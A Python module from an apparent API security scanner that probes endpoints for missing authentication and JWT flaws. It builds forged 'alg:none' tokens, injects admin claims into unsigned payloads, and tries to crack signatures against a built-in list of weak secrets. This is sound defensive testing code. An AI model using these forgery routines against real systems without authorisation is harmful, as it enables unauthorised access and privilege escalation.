import httpx
import jwt
import base64
import json
from typing import Optional, Dict, List
from app.scanners.base import send_request, get_baseline, build_finding

WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "test",
    "changeme", "qwerty", "letmein", "welcome", "abc123"
]


def extract_jwt(headers: Optional[Dict]) -> Optional[str]:

    if not headers:
        return None
    auth = headers.get("Authorization", headers.get("authorization", ""))
    if auth.lower().startswith("bearer "):
        return auth.split(" ", 1)[1]
    return None


def decode_jwt_unverified(token: str) -> Optional[Dict]:

    try:
        return jwt.decode(token, options={"verify_signature": False})
    except Exception:
        return None


def tamper_jwt_payload(token: str, extra_claims: Dict) -> Optional[str]:

    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        payload_bytes = parts[1] + "=="
        payload = json.loads(base64.urlsafe_b64decode(payload_bytes))

        payload.update(extra_claims)

        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=").decode()

        return f"{parts[0]}.{new_payload}.{parts[2]}"
    except Exception:
        return None


def build_alg_none_jwt(token: str) -> Optional[str]:

    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()

        payload_bytes = parts[1] + "=="
        payload = json.loads(base64.urlsafe_b64decode(payload_bytes))

        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=").decode()

        return f"{header}.{new_payload}."
    except Exception:
        return None


async def run(
    url: str,
    method: str = "GET",
    headers: Optional[Dict] = None,
    body: Optional[Dict] = None
) -> List[Dict]:
    findings = []

    stripped_headers = {
        k: v for k, v in (headers or {}).items()
        if k.lower() not in ["authorization", "x-auth-token", "x-api-key"]
    }

    no_auth_resp = await send_request(method, url, headers=stripped_headers, body=body)

    if no_auth_resp and no_auth_resp.status_code in [200, 201]:
        findings.append(build_finding(
            scanner="auth",
            severity="critical",
            title="Endpoint Accessible Without Authentication",
            description=(
                "The endpoint returned a success response with no authentication "
                "token provided. This means authentication is not enforced."
            ),
            evidence={
                "status_code": no_auth_resp.status_code,
                "response_snippet": no_auth_resp.text[:300]
            },
            endpoint=url
        ))

    token = extract_jwt(headers)

    if not token:
        findings.append(build_finding(
            scanner="auth",
            severity="info",
            title="No JWT Token Provided",
            description="No Bearer token found in headers. JWT-specific tests skipped.",
            endpoint=url
        ))
        return findings

    payload = decode_jwt_unverified(token)

    none_token = build_alg_none_jwt(token)
    if none_token:
        none_headers = {**headers, "Authorization": f"Bearer {none_token}"}
        none_resp = await send_request(method, url, headers=none_headers, body=body)

        if none_resp and none_resp.status_code in [200, 201]:
            findings.append(build_finding(
                scanner="auth",
                severity="critical",
                title="JWT alg:none Attack Successful",
                description=(
                    "The server accepted a JWT with algorithm set to 'none', "
                    "meaning no signature verification is performed. An attacker "
                    "can forge any token and gain unauthorized access."
                ),
                evidence={
                    "forged_token": none_token,
                    "status_code": none_resp.status_code
                },
                endpoint=url
            ))

    tamper_claims = {"role": "admin", "is_admin": True, "admin": True}
    tampered_token = tamper_jwt_payload(token, tamper_claims)

    if tampered_token:
        tamper_headers = {**headers, "Authorization": f"Bearer {tampered_token}"}
        tamper_resp = await send_request(method, url, headers=tamper_headers, body=body)

        if tamper_resp and tamper_resp.status_code in [200, 201]:
            findings.append(build_finding(
                scanner="auth",
                severity="critical",
                title="JWT Signature Not Verified — Payload Tampering Successful",
                description=(
                    "The server accepted a JWT with a tampered payload "
                    "(role set to admin) without verifying the signature. "
                    "This allows privilege escalation by any user."
                ),
                evidence={
                    "injected_claims": tamper_claims,
                    "status_code": tamper_resp.status_code
                },
                endpoint=url
            ))

    for secret in WEAK_SECRETS:
        try:
            jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512"])
            findings.append(build_finding(
                scanner="auth",
                severity="critical",
                title="JWT Signed With Weak Secret",
                description=(
                    f"The JWT token was successfully verified using the weak "
                    f"secret '{secret}'. An attacker can forge valid tokens."
                ),
                evidence={"cracked_secret": secret},
                endpoint=url
            ))
            break
        except Exception:
            continue

    if payload:
        try:
            # Try sending the original token with strict expiry check disabled
            exp = payload.get("exp")
            if exp:
                baseline = await send_request(method, url, headers=headers, body=body)
                if baseline and baseline.status_code in [200, 201]:
                    findings.append(build_finding(
                        scanner="auth",
                        severity="info",
                        title="Token Accepted (Expiry Check Passed)",
                        description="Token has an expiry claim and the server accepted it.",
                        evidence={"exp": exp},
                        endpoint=url
                    ))
            else:
                findings.append(build_finding(
                    scanner="auth",
                    severity="medium",
                    title="JWT Has No Expiry Claim",
                    description=(
                        "The JWT token does not contain an 'exp' (expiration) claim. "
                        "This means the token never expires and is valid indefinitely."
                    ),
                    evidence={"decoded_payload": payload},
                    endpoint=url
                ))
        except Exception:
            pass

    return findings
